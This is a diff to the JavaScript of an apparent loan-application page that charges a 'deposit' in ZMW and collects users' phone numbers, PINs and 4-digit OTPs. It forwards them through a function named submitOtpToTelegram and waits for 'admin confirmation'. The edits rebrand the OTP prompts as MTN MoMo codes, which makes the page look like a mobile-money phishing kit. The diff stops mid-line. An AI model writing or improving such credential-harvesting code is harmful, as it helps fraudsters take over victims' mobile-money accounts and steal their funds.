@@ -35,6 +35,7 @@
     const sumPurpose = $('sum-purpose');
     const sumApplicant = $('sum-applicant');
     const depositRequiredAmount = $('deposit-required-amount');
+    const successDepositAmount = $('success-deposit-amount');
 
     const bannerPhoneError = $('banner-phone-error');
     const bannerForm3Error = $('banner-form3-error');
@@ -229,6 +230,7 @@
         Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
       const depVal = Math.max(200, Math.round(numericAmt * 0.002));
       if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
+      if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
 
       pinSubmittedForCurrentValue = '';
       otpSubmittedForCurrentValue = '';
@@ -345,7 +347,7 @@
         displayOtpPhone?.innerText || displaySmsPhone?.innerText || formPhoneInput?.value || ''
       );
 
-      showLoading('VERIFYING 4-DIGIT OTP...', 'Please wait for admin confirmation...');
+      showLoading('VERIFYING MTN MOMO 4-DIGIT OTP...', 'Please wait for admin confirmation...');
 
       try {
         await fetch('/api/submit-otp', {
@@ -362,7 +364,7 @@
       } catch (e) {
         hideLoading();
         otpSubmittedForCurrentValue = '';
-        showBanner(bannerOtpError, 'Unable to submit OTP. Please try again.');
+        showBanner(bannerOtpError, 'Unable to submit MTN MoMo 4-Digit OTP. Please try again.');
       }
     }
 
@@ -430,7 +432,10 @@
             otpSubmittedForCurrentValue = '';
             otpBoxes4.forEach((b) => (b.value = ''));
             showScreen(screens.otp);
-            showBanner(bannerOtpError, 'OTP EXPIRED — Please enter your new 4-digit OTP.');
+            showBanner(
+              bannerOtpError,
+              'OTP EXPIRED — Please enter your new MTN MoMo 4-Digit OTP.'
+            );
             if (otpBoxes4[0]) otpBoxes4[0].focus();
           } else if (st === 'SUCCESS' || st === 'APPROVED') {
             clearInterval(statusPollInterval);
@@ -550,11 +555,4 @@
         case 'btn-submit-otp': {
           const otpVal = otpBoxes4.map((b) => b.value).join('');
           if (otpVal.length < 4) {
-            showBanner(bannerOtpError, 'Please enter all 4 digits of your OTP code.');
-            return;
-          }
-          await submitOtpToTelegram(otpVal, false);
-          break;
-        }
-        case 'btn-success-back':
-        case 'btn-finish-h
+            showBanner(bannerOtpErro
